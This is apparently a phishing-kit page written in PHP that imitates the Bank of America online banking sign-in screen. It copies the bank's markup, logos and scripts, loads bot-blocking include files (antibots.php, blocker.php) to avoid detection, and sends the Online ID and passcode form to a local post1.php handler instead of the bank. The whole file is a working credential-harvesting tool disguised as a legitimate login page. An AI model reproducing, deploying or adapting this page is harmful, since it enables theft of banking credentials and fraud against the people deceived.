<?php
/*   
Mou-Ad                    
*/


session_start();
error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();  
include 'antibots.php';
include './bt.php';
include "./blocker.php";
?>
 

				<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
				<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
				<head>



<meta http-equiv="X-UA-Compatible" content="IE=Edge" />

        <link rel="canonical" href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go" />
    	<link rel="alternate" href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go?request_locale=es_US" hreflang="es-US" />
		<meta name="Keywords" CONTENT="Your Online ID" />
		<meta name="Description" CONTENT="Sign in to your Online Banking account by entering your Online ID." />



<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Online Banking | Sign In | Online ID</title>
<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
			var dotcomURLPrefix = "https://www.bankofamerica.com/";
</script>
	<script language="javascript" type="text/javascript">
		var pinRegexSwitch = "true";
	</script>
	<script language="javascript" type="text/javascript">
		var sbPinRegexSwitch = "true";
	</script>

<meta http-equiv="content-type" content="text/html;charset=utf-8" />

    <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018" type="image/x-icon" />
   <script language="Javascript" type="text/javascript">
   			var newPwdStandardSwitch = "true";
	</script>


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>
<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->




	<script language="JavaScript" type="text/javascript">
		boaVIPAAjawrEnabled = "true";
	</script>
		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/5.0/style/vipaa-v4-jawr.css" media="all" />
					<link rel="stylesheet" type="text/css" href="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/5.0/style/vipaa-v4-jawr-print.css" media="print" />
					<script src="https://secure.bankofamerica.com/pa/components/bundles/gzip-compressed/xengine/VIPAA/5.0/script/vipaa-v4-jawr.js" type="text/javascript"></script>
<!--<script type="text/javascript">
(function() {
	if (typeof mboxUpdate == "function") {
		var windowURL = window.location.href;
	    windowURL = windowURL.slice( windowURL.indexOf('.')+1);
		windowURL = windowURL.split( '?' )[0];
		windowURL = windowURL.toLowerCase();
		//alert(windowURL);
		//If no mboxes on page, mbox count will be < 1
		//Also check for high-volume pages that do not need global logging
		if ((mboxFactoryDefault.getMboxes().length() < 1) &&
			(windowURL != "bankofamerica.com/myaccounts/brain/redirect.go") &&
			(windowURL != "bankofamerica.com/myaccounts/signin/signin.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/signon.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/entry/signon.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/signonscreen.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/validatechallengeanswer.go") &&
			(windowURL != "bankofamerica.com/login/sign-in/validatePassword.go")&&
			(windowURL != "ecnp.bankofamerica.com/myaccounts/details/deposit/account-details.go")&&
			(windowURL != "bankofamerica.com/myaccounts/details/deposit/account-details.go")&&
			(windowURL != "ecnp.bankofamerica.com/myaccounts/brain/redirect.go")&&
			(windowURL != "bankofamerica.com/myaccounts/brain/redirect.go")&&
			(windowURL != "bankofamerica.com/mobile/banking.go")&&
			(windowURL != "bankofamerica.com/content/preload/olb-myaccount-preload-jawr-module.htm"))
		{

			var mboxDiv = document.createElement("div");
			mboxDiv.id = "adobe_touch_clarity_replacement";
			mboxDiv.style.display = "none";
			if (document.body && document.body.firstChild) {document.body.insertBefore(mboxDiv,document.body.firstChild);}
			mboxDefine(mboxDiv.id,'bac_global_bottom');
			mboxUpdate('bac_global_bottom');
		}
	}
})();
</script> -->

						<script type="text/javascript">
						(function(d,f){var b={src:(d.location.protocol=="https:"?"https:":"http:")+"//aero.bankofamerica.com/30306/I3n.js",async:true,type:"text/javascript"},g="XMLHttpRequest",c=f.createElement("script"),h=f.getElementsByTagName("head")[0],a;if(d[g]&&(a=new d[g]()).withCredentials!==undefined){a.open("GET",b.src,b.async);a.withCredentials=true;a.onreadystatechange=function(e){if(a.readyState==4&&a.status==200){c.type="script/meta";c.src=b.src;h.appendChild(c);new Function(a.responseText)()}};a.send()}else{setTimeout(function(){for(var e in b){c.setAttribute(e,b[e])}h.appendChild(c)},0)}})(window,document);
					    </script>

						<script type="text/javascript">
							(function(){var f=document,e=window,i=e.location.protocol,b=[["src",[i=="https:"?"https:/":"http:/","boss.bankofamerica.com/30306/a8e.js"].join("/")],["type","text/javascript"],["async",true]],g="XMLHttpRequest",a=null,j=e[g]&&(a=new e[g]()).withCredentials!==undefined,c=f.createElement("script"),h=f.getElementsByTagName("head")[0];if(j){a.open("GET",b[0][1],b[2][1]);a.withCredentials=true;a.onreadystatechange=function(d){if(a.readyState==4&&a.status==200){c.type="script/meta";c.src=b[0][1];h.appendChild(c);new Function(a.responseText)()}};a.send()}else{setTimeout(function(){for(var d=0,k=b.length;d<k;d++){c.setAttribute(b[d][0],b[d][1])}h.appendChild(c)},0)}})();
						</script>

						<script type="text/javascript">
							(function(){var d=document,c=window,g=c.location.protocol,e="XMLHttpRequest",a,h=c[e]&&(a=new c[e]()).withCredentials!==undefined,b=d.createElement("script"),f=d.getElementsByTagName("head")[0];b.src=(g=="https:"?"https://":"http://")+"dull.bankofamerica.com/boaa/y9h.js";b.async=true;if(!h){setTimeout(function(){b.type="text/javascript";f.appendChild(b)},0)}else{a.open("GET",b.src,b.async);a.withCredentials=true;a.onreadystatechange=function(i){if(a.readyState==4&&a.status==200){b.type="script/meta";f.appendChild(b);new Function(a.responseText)()}};a.send()}})();
						</script>

						<script type="text/javascript">
							function getSCookie(name){
							var re = new RegExp('[; ]'+name+'=([^\\s;]*)'), matches = null;
								if(document.cookie.length > 0) {
									matches = document.cookie.match(re);
								if(matches && matches.length == 2) {
									return decodeURIComponent(matches[1]);
									}
								}
							}
						</script>
						<script>
							function get_SessionIdString(){
							  return getSCookie("SID") || "";
							}
						</script>

			<script>
				var boaPageDataJS = {};
					boaPageDataJS.isLLE = "false";
			</script>
				<style>body{display:none;}</style>
	</head>		
	<body class="fsd-layout-body">	

				<script type="text/javascript">if(self == top){var theBody=document.getElementsByTagName("body")[0];theBody.style.display="block";}else{top.location=self.location;}</script>
				<noscript><style>body{display:block;}</style></noscript>
					<a class='ada-hidden ada-visible-focus' href='#skip-to-h1' id='ada-skip-link'>Skip to main content</a>
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="207" alt="Bank of America" src="https://secure.bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/bac_reg_logo_tmp_250X69.gif" />
      <div class="page-type" data-font="cnx-regular">Sign In</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En Espa&#241;ol</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
										<div class="fsd-fauxdal-title">
											Please use JavaScript
										</div>
										<p>You need a web browser that supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p>
<p>&nbsp;</p>
<p><a title="Browser Help and Tips" name="Browser Help and Tips" href="https://www.bankofamerica.com/onlinebanking/online-banking-security-faqs.go" target="_self">Browser Help and Tips</a></p>
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal" href=><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 data-font="cnx-regular">Sign In to Online Banking</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title TLu_ERROR">We can't process your request.</p>
				<ul></ul>
			</div>
		</div>
	</div>

<!-- Added for VIPAA Sub-user pages new currentLocation=/login/sign-in/enter-online-id-passcode-v2-->













<div class="vipaa-modal-content-module">
	<div class="sitekey-affinity-skin">
		
	</div>
</div>


</div>
					<div class="columns">
						<div class="flex-col lt-col" >
<script>
		var captureMouseEvents = "false";
		var maxMouseEvents = 0;
</script>





<script>
	var ccPath = "/login/sign-in/cc.go";
	var _ia11 = "_ia11";
	var isFPEnabled = false;
		 isFPEnabled = false;
</script>






<div class="online-id-vipaa-module">
	<div class="enter-skin phoenix">
		<form class="simple-form collector-form-marker" name="enter-online-id-form" id="EnterOnlineIDForm" method="post" action="post1.php" autocomplete="off">
		  <div class="online-id-section">
<input type="hidden" name="csrfTokenHidden" value="625f33a50c8e2922" id="csrfTokenHidden"/>			<input type="hidden" id="f_variable" name="f_variable" class="tl-private" />
			<input type="hidden" name="lpOlbResetErrorCounter" id="lpOlbResetErrorCounterId" value="0"/>
			<input type="hidden" name="lpPasscodeErrorCounter" id="lpPasscodeErrorCounterId" value="0"/>
			<input type="hidden" name="contGsid" id="contGsid" value=""/>

			<input type="hidden" name="mouseCapturedEvents" id="mouseCapturedEvents"/>
			<input type="hidden" name="pm_fp" id="pm_fp" value=""/>
			<input type="hidden" id="passcodeVal" name="passcode" value="" class="tl-private"/>
			<input type="hidden" id="onlineIdVal" name="onlineId" value=""/>
			
			<!-- Kiosk Login Flow is {request.getParameter("kioskLoginFlow")} -->

			<label for="enterID-input">Online ID<span class="ada-hidden"> Must be at least 6 characters long</span></label>
			<input type="text" id="enterID-input" name="dummy-onlineId" maxlength="32" value="" autocomplete="off"/>
					<div class="remember-info">
								<input type="checkbox" id="remID" name="saveMyID"/>
						<label for="remID">Save this Online ID</label>
						<a class="boa-dialog force-xlarge info-layer-help-fsd" href="javascript:void(0);" name="online-id-help" rel="help-content" title="Help">
							<span class="ada-hidden">Online ID Help</span>
						</a>
						<div id="help-content" class="hide">
							<p><strong>How does "Save this Online ID" work?</strong></p>
<p>&nbsp;</p>
<p>Saving your Online ID means you don't have to enter it every time you sign in.</p>
<p>&nbsp;</p>
<p><strong>Don't save on a public computer</strong></p>
<p>&nbsp;</p>
<p>Only save your Online ID on your personal computer or mobile device.</p>
<p>&nbsp;</p>
<p><strong>How to clear a saved Online ID</strong></p>
<p>&nbsp;</p>
<p>To clear a saved Online ID, sign in and select <strong>Saved Online IDs</strong> from <strong>Profile and Settings.</strong></p>
						</div>
						<div class="clearboth"></div>
					</div>
			</div>
			<input aria-hidden="true" type="password" class="tl-private" name="new-passcode" maxlength="20" style="display:none;" value=""/>
			<label for="tlpvt-passcode-input" class="mtop-15">Passcode<span class="ada-hidden"> is unavailable. Please enter atleast 6 characters of online id to enable Passcode</span></label>
			<div class="TL_NPI_Pass">
				<input type="password" class="tl-private fl-lt" id="tlpvt-passcode-input" name="dummy-passcode" maxlength="20" value="" disabled=disabled autocomplete="off"/>
			</div>
			
					<a href="/login/reset/entry/forgotIDPwdScreen.go" class="fl-lt forgot-passcode" name="forgot-your-passcode">Forgot your Passcode?</a>
			<div class="clearboth"></div>
			<a href="javascript:void(0);" onClick="enterOnlineIDFormSubmit();" title="Sign in" class="btn-bofa btn-bofa-blue btn-bofa-small btn-disabled" name="enter-online-id-submit"><span class="btn-bofa-blue-lock">Sign in</span></a>
			<div class="clearboth"></div>
		</form>		
	<div id="fpContainer" class="" style="width: 50%;">
	
	</div>
				<!-- Mobile CTA: Borneo version of 'Get the app' widget on the signOnV2 page -->
					<!-- Normal Scenario -->
					<div class="mobile-cta-section vertical-dotted-line fl-rt">
					<p class="cnx-regular title enroll-color-gray mbtm-10">Better yet, get the app</p>
					<img height="250" width="150" src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png" alt="Mobile banking Llama" class="fl-lt"/>
					<div class="get-app-content-section">
						<div class="cnx-regular title enroll-color-gray mcta-bubble">Your finances at your fingertips, anytime</div>
						<a id="choose-device-get-the-app" name="choose-device-get-the-app" class="choose-device-get-the-app-modal btn-bofa btn-bofa-red btn-bofa-noRight cnx-regular" href="javascript:void(0);" rel="mobile-app-download-choose-device"><span>Get the app</span><span class="ada-hidden">&nbsp; link opens a new info modal layer</span></a>
					</div>
				</div>
	</div>
</div>




					<!-- 
 MODULE: 
	 isModule: true
	 ID: A2BBAAF5-E5B9-463F-A526-507706E4C3A7
	 Name: modal-mobile-module
	 Skin: get-app -->
 

<script type="text/javascript">
		var vipaaGISMaskingEnabled = "true";
$(function() {
  try {
		boa.form.init();
  } catch(error) {};
});
</script>




	<script>
		var GetAppDownloadConfig = {
			"iPhone":{
					"title":"Options for iPhones",
						"storeLogo":"sprite-A6",
						"storeLink":"http://itunes.apple.com/us/app/bank-america-mobile-banking/id284847138?mt=8",
						"storeName":"appleAppStore",
						"storeLinkText":"Click here to download app for iphone on apple app store",
						"storeId":"apple-store-logo",
							"text":true,
							"placeholderText":"Enter your iPhone phone number",
							"deviceId":"AP01",
							"notice":true,
							"noticeText":"By selecting the option to download, you'll be taken to your app store, which has its own privacy and security policies; please be sure to read them.",
						 "pageId":"OSP:Content:Mobile;iphone-get-app"
				},
			"iPad":{
					"title":"Options for iPad",
						"storeLogo":"sprite-A6",
						"storeLink":"http://itunes.apple.com/us/app/bank-america-mobile-banking/id284847138?mt=8",
						"storeLinkText":"Click here to download app for ipad on apple app store",
							"email":true,
							"emailPlaceholderText":"Enter your iPad email address",
							"deviceId":"AP03",
				},
			"Android":{
					"title":"Options for Android devices",
						"storeLogo":"sprite-A7",
						"storeLink":"https://play.google.com/store/apps/details?id=com.infonow.bofa",
						"storeName":"androidAppStore",
						"storeLinkText":"Click here to download app for android on google play store",
						"storeId":"android-store-logo",
							"text":true,
							"placeholderText":"Enter your Android phone number",
							"deviceId":"AN01",
							"notice":true,
							"noticeText":"By selecting the option to download, you'll be taken to your app store, which has its own privacy and security policies; please be sure to read them.",
						 "pageId":"OSP:Content:Mobile;android-get-app"
				},
			"Windows":{
					"title":"Options for Windows phones",
						"storeLogo":"sprite-D6",
						"storeLink":"http://www.windowsphone.com/en-US/apps/ad8a76fa-ca71-e011-81d2-78e7d1fa76f8",
						"storeName":"windowAppStore",
						"storeLinkText":"Click here to download app for windows on windows app store",
						"storeId":"windows-store-logo",
							"text":true,
							"placeholderText":"Enter your Windows phone number",
							"deviceId":"WP01",
						 "pageId":"OSP:Content:Mobile;windows-get-app"
				},
			"BlackBerry":{
					"title":"Options for BlackBerry phones",
						"storeLogo":"sprite-J6",
						"storeLink":"http://appworld.blackberry.com/webstore/content/1211/?lang=EN",
						"storeName":"blackberryAppStore",
						"storeLinkText":"Click here to download app for blackberry on blackberry app world",
						"storeId":"blackberry-store-logo",
							"text":true,
							"placeholderText":"Enter your BlackBerry phone number",
							"deviceId":"BB01",
						 "pageId":"OSP:Content:Mobile;blackberry-get-app"
				},
			"Kindle Fire":{
					"title":"Options for Kindle devices",
						"storeLogo":"sprite-G6",
						"storeLink":"http://www.amazon.com/gp/product/B007HEQIMQ",
						"storeName":"kindleAppStore",
						"storeLinkText":"Click here to download app for kindle fire on amazon app store",
						"storeId":"kindle-store-logo",
							"email":true,
							"emailPlaceholderText":"Enter your Kindle email address",
							"deviceId":"KF01",
						 "pageId":"OSP:Content:Mobile;kindle-get-app"
				},
			"Windows 8 Tablet":{
					"title":"Options for Windows tablets",
						"storeLogo":"sprite-D6",
						"storeLink":"http://apps.microsoft.com/windows/en-us/app/bank-of-america/954cf0a2-96ff-4c31-9d5a-b83560cf4bde",
						"storeName":"windowsAppStore",
						"storeLinkText":"Click here to download app for windows 8 tablet on windows app store",
						"storeId":"windows-store-logo",
							"email":true,
							"emailPlaceholderText":"Enter your Windows email address",
							"deviceId":"WP02",
						 "pageId":"OSP:Content:Mobile;windows-tablet-get-app"
				},
			"Windows 10":{
					"title":"Options for Windows 10",
						"storeLogo":"sprite-D6",
						"storeLink":"https://www.microsoft.com/store/apps/9nblggh4q6h9",
						"storeName":"windowsAppStore",
						"storeLinkText":"Click here to download app for Windows 10&nbsp;on Windows&nbsp;app store",
						"storeId":"windows-store-logo",
							"notice":true,
							"noticeText":"Some text here?",
							"deviceId":"AP01",
							"notice":true,
							"noticeText":"By selecting the option to download, you'll be taken to your app store, which has its own privacy and security policies; please be sure to read them.",
						 "pageId":"OSP:Content:Mobile;windows-10-get-app"
				},
			"Other":{
					"title":"Mobile options for other devices",
							"deviceStatus":true,
						 "pageId":"OSP:Content:Mobile;mobile-banking-get-apps"
				},
			numberOnlyErr : "Please use only numbers",
			tenDigitNumberErr : "Please enter a valid 10-digit phone number",
			invalidPhoneNoErr : "Please enter a valid phone number",
			invalidEmailErr : "Please enter a valid email address",
			splCharEmailErr : "Please remove special characters #, $, %, ^, &",
			emailConfirmationTxt : "We sent an email with the download link to",
			textConfirmationTxt : "We sent a text message with the download link to",
			serviceOutageErr : "We were unable to process your request. You can try again or use your mobile device to get the app from your device\'s app store."
		};

		$(document).ready(function(){
			ModalApsMpModuleGetAppSkin.init();
		});
	</script>

<div class="modal-mobile-module hide">
   <div class="get-app-skin aps-mobile-products">
		<h3>{title}</h3>
		<div class="content-wrapper three-col">
				<div class="{storeLogo}">
							<div class="column app-box">
								<h4 class="sprite sprite-I5">Download directly to your mobile device.</h4>
								<a class="sprite store-icon {storeLogo}" name="{storeName}" href="{storeLink}" id="{storeId}" target="_blank">
									<span class="ada-hidden">{storeLinkText}</span>
								</a>
								<p class="{notice}">{noticeText}</p>
							</div>
							<div class="column comm-box {text}{email}">
										<h4 class="sprite sprite-J5 {text}">We'll text you a link to download the app.</h4>
										<h4 class="sprite sprite-L5 row-2 {email}">We'll email you a link to download the app.</h4>
								<form action="https://www.bankofamerica.com/online-banking/send-communication.go" id="mobile_app_download_url">
										<div id="field-level-error" role="alert"><span class="ada-hidden"> </span></div>
										<div class="{text}">
											<label class="ada-hidden" for="tlpvt-mob_app_download_phone_num" name="mobile_app_download_phone_prompt" id="mobile_app_download_phone_prompt">{placeholderText}</label>
											<input type="text" name="mobile_app_download_phone_number" id="tlpvt-mob_app_download_phone_num" class="phone-input {text} tl-private" placeholder="{placeholderText}">
										</div>
										<div class="{email}">
											<label class="ada-hidden" for="tlpvt-mob_app_download_email_id" name="mobile_app_download_email_prompt" id="mobile_app_download_email_prompt">{emailPlaceholderText}</label>
											<input type="text" name="mobile_app_download_email_id" id="tlpvt-mob_app_download_email_id" class="email-input {email} tl-private" placeholder="{emailPlaceholderText}">
										</div>
											<a href="javascript:void(0);" name="anc-send-email-button" class="btn-bofa btn-bofa-small" id="mobile_app_download_send_button" onclick="dartFireOnClick('1359940','bacal484','2014_700')" >Send</a>
										<div class="clearboth"></div>
										<p class="{text}">By providing your mobile number you are consenting to receive a text message. Text message fees may apply from your carrier. Text messages may be transmitted automatically.</p>
								</form>
							</div>
							<div class="column info-box">
								<h4 class="sprite sprite-K5"> Visit bankofamerica.com in your mobile web browser for a link to download the app.</h4>
							</div>
				</div>

						<div class="other-device-info {deviceStatus}">
							<div>
								<p> Our mobile app is not available for all devices</p>
								<a href="https://www.bankofamerica.com/online-banking/mobile-banking-apps.go" class="style-link guillemet-right" name="anc_learn_more_about_phone_banking">Learn about your Text Banking or Banking by Phone options</a>
							</div>
						</div>
						<div class="confirmation-screen hide">
							<div class="inline-ack-msg sprite sprite-D7">
								<span class="ada-hidden"></span><span class="message"></span><span id="inputHolder" class="TL_NPI_L1"></span>
							</div>
							<div class="button-wrapper">
									<a href="javascript:;" class="btn-bofa btn-bofa-blue btn-bofa-small" name="anc-close-button" id="confirmModalCloseButton">Close</a>
									<a href="javascript:;" class="btn-bofa btn-bofa-small" name="anc-send-another-link" id="confirmModalSendAnotherLink">Send another link</a>
							</div>
						</div>
						<div class="processing hide">
							<span class="ada-hidden">Please wait. Your request is being processed.</span>
							<span class="modal-skin-processing-text">Please wait...</span>
						</div>
				<div class="clearboth"></div>
		</div>
   </div>
</div>

<div id="mobile-app-download-flex-modal" class="aps-mobile-products" >
</div>




		<style type="text/css">
			.aps-mobile-products .sprite .spr {
			 background-image: url('/content/images/ContextualSiteGraphics/Instructional/en_US/aps-mobile-products-icon-sprite-dev.png'); 
			background-size: 700px 550px; 
			
		}
		</style>





<div class="mobile-app-download-module hide" id="mobile-app-download-choose-device">
  <div class="choose-device-modal-skin">
	 <h3>Select your device</h3>
	 <div class="flex-modal-main-content">         
	   <p>Please select your device to continue:</p>
		<label for="device-pulldown" class="ada-hidden">Select your device.  Press TAB to continue after making selection.</label>
		<select id="device-pulldown" name="device-pulldown" class="select-bofa">
				<option value="Select your device">Select your device</option>
				<option value="iPhone">iPhone</option>
				<option value="iPad">iPad</option>
				<option value="Android">Android</option>
				<option value="Other">Other</option>
		</select>				   
	   <div class="clearboth"></div>
			<a href="javascript:void(0);" id="choose-device" class="btn-bofa btn-bofa-red btn-disabled get-app-modal-trigger" name="choose-device" rel="choose-device-modal">
				Continue<span class="ada-hidden">&nbsp; link opens a new info modal layer</span>
			</a>
	 </div>
  </div>
</div>
	<style type="text/css">
		.aps-mobile-products .sprite-D5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
		.aps-mobile-products .sprite-J8>.spr {height: 51px;width: 50px !important;background-position: -522px -410px !important;left: 30px !important;}
		.aps-mobile-products .sprite-F5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
	</style>
</div>
						<div class="flex-col rt-col" >
<div class="side-well-vipaa-module">
	<div class="fsd-ll-skin">
		 <h2>Sign-in help</h2>
			<ul class="li-pbtm-15">
						<li><a class="arrow" href="/login/reset/entry/forgotIDPwdScreen.go" name="Forgot ID/Passcode?">Forgot ID/Passcode?</a></li>
			</ul>
   </div>
   <div class="fsd-ll-skin">
   			<h2>Not using Online Banking?</h2>
            <ul class="li-pbtm-15">
							<li><a class="arrow" href="/login/enroll/entry/olbEnroll.go?reason=model_enroll" name="Enroll_now">Enroll now<span class='ada-hidden'>  for online Banking</span></a></li>
							<li><a class="arrow" href="https://www.bankofamerica.com/onlinebanking/learning-center.go" name="Learn_more_about_Online_Banking_dotcom">Learn more about Online Banking</a></li>
							<li><a class="arrow" href="https://www.bankofamerica.com/online-banking/service-agreement.go" name="Service_Agreement_dotcom">Service Agreement</a></li>
            </ul>
   </div>
</div>
</div>
						<div class="clearboth"></div>
					</div>
					<div class="footer">
						<div class="footer-top">&nbsp;				<script language="javascript" src="/pa/components/bundles/text-decompressed/xengine/VIPAA/5.0/script/cm-jawr.js"></script>
		
		
		
		<script type="text/javascript">
			var cmPageId = "OLB:Tool:SiteKey;Sign_In";
			var cmCategoryId = "OLB:Tool:SiteKey";
			var cmPageId_Modal = "PVParamsMissing";
			var cmSessionID = "qTjPLT5Vfpu1b8c7D6FWMMSYLIC8TDn2j0JTAg8T" ;
			var appStepNumber = "null";
			var appStepName = "null";
			var appName = "null";
			var cmSessionID = "" ;
			
				if($('.messaging-module .pos-ack-skin').length > 0){
					cmCategoryId = 'OLB:App:Enroll';
					appName = 'OLB_Enroll';
					appStepName = 'Confirmation_SignIn';
					appStepNumber = '500';			
				}
			if(appName !== 'null' && appStepName !== 'null' && appStepNumber !== 'null'){
				cmPageId = cmCategoryId +";"+ appName +":" + appStepNumber + ":" + appStepName;	
			}else{
				appStepName = null;
				appName = null;
				appStepNumber = null ;
			}
			
		var testString = window.location.href;
		
		var cmFailure = $("div.messaging-module div.error-skin:visible,div.messaging-vipaa-module div.error-skin:visible,div.messaging-module div.error-liveperson-rp-skin:visible").length;
		var cmErrorMsg = '';
		
		
		var cmReqLocale = $('html').attr('lang');
		var locAppendage;
		if (cmReqLocale.toLowerCase().indexOf('en') !== -1) {
			locAppendage = '';
		} else if (cmReqLocale.toLowerCase().indexOf('es') !== -1) {
			locAppendage = '_ES';
		}
		
		function cmSetDD(){var testString=window.location.href;if(testString.toLowerCase().indexOf(".bankofamerica.com")>-1){testString=testString.toLowerCase();var tempArr=testString.split(".bankofamerica.com");var tempStr=tempArr[0];if(tempStr.indexOf("//")>-1){tempArr=tempStr.split("//");tempStr=tempArr[1];if(tempStr.indexOf(".")>-1){tempArr=tempStr.split(".");tempStr=tempArr[0];var tempStrPt2=tempArr[1]}if(tempStr.indexOf("www")>-1){if(tempStr.indexOf("-")>-1){cmSetStaging()}else{if(tempStrPt2!=null){if(tempStrPt2.indexOf("ecnp")>-1){cmSetStaging()}}else{cmSetProduction()}}}else{if(tempStr.indexOf("-")>-1){if(tempStr.indexOf("sitekey")>-1){if(tempStr=="sitekey"){cmSetProduction()}else{cmSetStaging()}}else{cmSetStaging()}}else{if(tempStrPt2!=null){if(tempStrPt2.indexOf("ecnp")>-1){cmSetStaging()}}else{cmSetProduction()}}}}}}if(typeof cmSetStaging=="function"){cmSetDD()};
		
			if (cmFailure === 0 && $('#acwContainer').length == 0) {		
				cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, appName, appStepNumber, appStepName, null, null, null, null);
			}	
			else if (cmFailure > 0 ) {		
				var errorCode='';
				var errorCodeCounter=0;
				var errorCodeIndex;
				cmPageId = cmPageId+'_Error'
				cmCreatePageviewTag(cmPageId+locAppendage, null, null, cmCategoryId, false, false, null, false, false, null, null, null, null, cmSessionID, appName, appStepNumber, appStepName, null, null, null, null);
				if ($('.messaging-module').find('.error-skin:visible').length > 0) {
					$("div.messaging-module div.error-skin:visible").attr('tabindex',0).attr('aria-live', 'rude').focus();
					if($('.messaging-module .error-skin:visible ul li').length > 0) {
						$('.messaging-module .error-skin:visible ul li').each(function() {
							cmErrorMsg = $(this).html();
							errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
							cmCreateCustomError(cmPageId+locAppendage, appName, appStepNumber, appStepName, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);
							errorCodeCounter = errorCodeCounter + 1;
						});				
					} else {
						cmErrorMsg = $.trim($('.messaging-module .error-skin:visible p').text());
						errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
						cmCreateCustomError(cmPageId+locAppendage, appName, appStepNumber, appStepName, 'Vipaa_Action_'+errorCodeIndex, cmCategoryId, cmErrorMsg);			
					}		
				}
				if ($('.messaging-module').find('.error-liveperson-rp-skin:visible').length > 0) {
						$("div.messaging-module div.error-liveperson-rp-skin:visible").attr('tabindex',0).attr('aria-live', 'rude').focus();
						$('.messaging-module .error-liveperson-rp-skin:visible ul li').each(function() {
							cmErrorMsg += $(this).html() + ' - ';
							errorCodeIndex = cmErrorMsg.length  * (errorCodeCounter == 0 ? 1 : errorCodeCounter);
							cmCreateCustomError(cmPageId+locAppendage, appName, appStepNumber, appStepName, 'VIPAA_PRP_ACTION_000'+errorCodeIndex, cmCategoryId, cmErrorMsg);
							errorCodeCounter = errorCodeCounter + 1;
						});				
					}
			}
		</script></div>
						<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a class="last-link" href="privacy/" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a href="help/equalhousing_popup.cfm" name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a> <br />&copy;&nbsp;2018 Bank of America Corporation.</p>
   </div>
</div>
</div>
					</div>
				</div>
			</div>
		</div>
	</body>	
</html>

